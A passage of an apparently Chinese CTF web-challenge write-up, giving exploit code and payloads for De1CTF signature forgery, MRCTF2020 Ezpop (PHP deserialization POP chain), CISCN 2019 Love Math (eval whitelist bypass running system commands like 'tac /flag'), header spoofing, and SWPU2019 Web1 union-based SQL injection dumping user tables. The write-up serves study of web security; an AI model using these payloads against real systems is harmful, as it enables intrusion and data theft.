class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#有两个地方可以传参：路由/geneSign和/De1ta</span></span><br><span class="line"><span class="comment">#/De1ta有task类，传参需要绕过waf，waf过滤掉gopher和file</span></span><br><span class="line"><span class="comment">#注意到返回return json.dumps(task.Exec())，所以我们最后是要观察Exec()</span></span><br><span class="line"><span class="comment">#		if (self.checkSign()):   再去观察此函数</span></span><br><span class="line"><span class="comment">#		等价带换为	hashlib.md5(secert_key + param + action).hexdigest() == self.sign而action，param，sign都是我们可以传参的，此处是参数值进行拼接的，很简单</span></span><br><span class="line"><span class="comment">#因为secert_key不知道，所以我们需要通过第一个路由、geneSign来得到，action已经固定，改变不了，这时只要我们第二个路由/De1ta的param+action传的参数等于第一个路由/geneSign的param传的参数+“scan”即可使hashlib.md5(secert_key + param + action).hexdigest() == self.sign这个等式成立，第一个判定即可通过</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#产生sign的过程secert_key + param + scan，我们可以传入的secert_key + param + readscan</span></span><br><span class="line"><span class="comment">#所以payload1就需要有read后缀</span></span><br><span class="line"><span class="comment">#payload1=&#x27;/geneSign?param=flag.txtread&#x27;</span></span><br><span class="line"><span class="comment">#payload2=&#x27;/De1ta?param=flag.txt&#x27;</span></span><br><span class="line"><span class="comment">#cookie:action=readscan;sign=1241cbbc38cc28f8fd798a7aae459683(payload1的回显)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="3-MRCTF2020-Ezpop"><a href="#3-MRCTF2020-Ezpop" class="headerlink" title="3.[MRCTF2020]Ezpop"></a>3.[MRCTF2020]Ezpop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span>;<span class="comment">//$var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);<span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)//调用函数的方式调用一个对象时的回应方法</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);<span class="comment">//调用本函数的append方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span> . <span class="keyword">$this</span>-&gt;source . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)//当一个对象被当作一个字符串使用</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;<span class="comment">//$show-&gt;str=$test,   $test-&gt;source会调用test的__get方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)//<span class="title">__wakeup</span>(<span class="params"></span>)//将在反序列化之后立即被调用(<span class="params">通过序列化对象元素个数不符来绕过</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) </span><br><span class="line">            <span class="comment">//$show1-&gt;source=$show,这里正则匹配就把show当作字符串处理了，进而调用show的tostring方法</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)//<span class="title">__get</span>(<span class="params"></span>)在获得一个类的成员变量时调用</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;<span class="comment">//p=new Modifiler()</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();   <span class="comment">//构造一个modifiler对象返回,进而调用Modifiler的__invoke方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//EXP：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$modifier</span>= <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$test</span>-&gt;p=<span class="variable">$modifier</span>;</span><br><span class="line"><span class="variable">$show</span>=<span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$show</span>-&gt;str=<span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$show1</span> = <span class="keyword">new</span> Show();</span><br><span class="line"></span><br><span class="line"><span class="variable">$show1</span>-&gt;source = <span class="variable">$show</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$show1</span>));</span><br><span class="line"><span class="comment">//O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="4-CISCN-2019-初赛-Love-Math"><a href="#4-CISCN-2019-初赛-Love-Math" class="headerlink" title="4.[CISCN 2019 初赛]Love Math"></a>4.[CISCN 2019 初赛]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//白名单中的数学函数，.,^等，同时长度限制在80个字符以内</span></span><br><span class="line"><span class="comment">//有两种思路，在这之前有几个php的特点要熟悉。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//动态函数</span></span><br><span class="line"><span class="comment">//php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数</span></span><br><span class="line"><span class="comment">//例如：$function = &quot;sayHello&quot;;$function();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//php中函数名默认为字符串</span></span><br><span class="line"><span class="comment">//例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择</span></span><br><span class="line"><span class="number">1</span>.payload</span><br><span class="line"><span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>)&#123;pi&#125;((<span class="variable">$$pi</span>)&#123;abs&#125;)&amp;pi=system&amp;abs=tac /flag</span><br><span class="line"></span><br><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">&quot;hex2bin&quot;</span></span><br><span class="line">dechex(<span class="number">1598506324</span>) =&gt; <span class="string">&quot;5f474554&quot;</span></span><br><span class="line"><span class="variable">$pi</span>=hex2bin(<span class="string">&quot;5f474554&quot;</span>) =&gt; <span class="variable">$pi</span>=<span class="string">&quot;_GET&quot;</span>   <span class="comment">//hex2bin将一串16进制数转换为二进制字符串</span></span><br><span class="line">(<span class="variable">$$pi</span>)&#123;pi&#125;((<span class="variable">$$pi</span>)&#123;abs&#125;) =&gt; (<span class="variable">$_GET</span>)&#123;pi&#125;(<span class="variable">$_GET</span>)&#123;abs&#125;  <span class="comment">//&#123;&#125;可以代替[]</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.payload</span><br><span class="line">    </span><br><span class="line"><span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br><span class="line">post传参执行命令</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="number">3</span>.payload</span><br><span class="line"><span class="comment">//exec(&#x27;hex2bin(dechex(109270211257898))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)</span></span><br><span class="line">(<span class="variable">$pi</span>=base_convert)(<span class="number">22950</span>,<span class="number">23</span>,<span class="number">34</span>)(<span class="variable">$pi</span>(<span class="number">76478043844</span>,<span class="number">9</span>,<span class="number">34</span>)(dechex(<span class="number">109270211257898</span>)))</span><br><span class="line"><span class="comment">//system(&#x27;cat&#x27;.dechex(16)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)</span></span><br><span class="line">base_convert(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)(base_convert(<span class="number">15941</span>,<span class="number">10</span>,<span class="number">36</span>).(dechex(<span class="number">16</span>)^asinh^pi))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h2 id="5-MRCTF2020-PYWebsite"><a href="#5-MRCTF2020-PYWebsite" class="headerlink" title="5.[MRCTF2020]PYWebsite"></a>5.[MRCTF2020]PYWebsite</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line"><span class="comment">//查看网页源代码发现有一个./flag.php网页,访问发现说只有购买者和我自己知道flag,所以加一个请求头X-Forward-For:127.0.0.1,然后继续访问拿到flag.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span>(<span class="params">code</span>)</span>&#123;</span><br><span class="line">      hash = hex_md5(code);</span><br><span class="line">      <span class="keyword">return</span> hash;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> code = <span class="built_in">document</span>.getElementById(<span class="string">&quot;vcode&quot;</span>).value;</span><br><span class="line">      <span class="keyword">if</span> (code != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(hex_md5(code) == <span class="string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;</span><br><span class="line">          alert(<span class="string">&quot;您通过了验证！&quot;</span>);</span><br><span class="line">          <span class="built_in">window</span>.location = <span class="string">&quot;./flag.php&quot;</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          alert(<span class="string">&quot;你的授权码不正确！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        alert(<span class="string">&quot;请输入授权码&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-SWPU2019-Web1"><a href="#6-SWPU2019-Web1" class="headerlink" title="6.[SWPU2019]Web1"></a>6.[SWPU2019]Web1</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,user(),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><span class="number">22</span></span><br><span class="line">root<span class="variable">@localhost</span>	<span class="number">10.2</span><span class="number">.26</span><span class="operator">-</span>MariaDB<span class="operator">-</span>log</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,database(),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><span class="number">22</span>web1	<span class="number">10.2</span><span class="number">.26</span><span class="operator">-</span>MariaDB<span class="operator">-</span>log</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><span class="number">22</span></span><br><span class="line">FLAG_TABLE,news,users,gtid_slave_pos,ads,users</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(a)/**/from/**/(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/users)qaq),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><span class="number">22</span></span><br><span class="line"><span class="number">3</span>,flag&#123;<span class="number">842</span>b63d9<span class="operator">-</span>f8ce<span class="number">-4346</span><span class="operator">-</span>ac05<span class="operator">-</span>a2713b4f8232&#125;,<span class="number">53e217</span>ad4c721eb9565cf25a5ec3b66e,e10adc3949ba59abbe56e057f20f883e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> secret;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+--------+</span></span><br><span class="line"><span class="operator">|</span> kkk  <span class="operator">|</span> lion <span class="operator">|</span> leo    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1234</span> <span class="operator">|</span> <span class="number">5678</span> <span class="operator">|</span> <span class="number">123123</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+--------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> secret;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2</span>    <span class="operator">|</span> <span class="number">3</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+--------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span>      <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1234</span> <span class="operator">|</span> <span class="number">5678</span> <span class="operator">|</span> <span class="number">123123</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+--------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> secret;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+--------+</span></span><br><span class="line"><span class="operator">|</span> kkk  <span class="operator">|</span> lion <span class="operator">|</span> leo    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1234</span> <span class="operator">|</span> <span class="number">5678</span> <span class="operator">|</span> <span class="number">123123</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+--------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">from</span>(<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 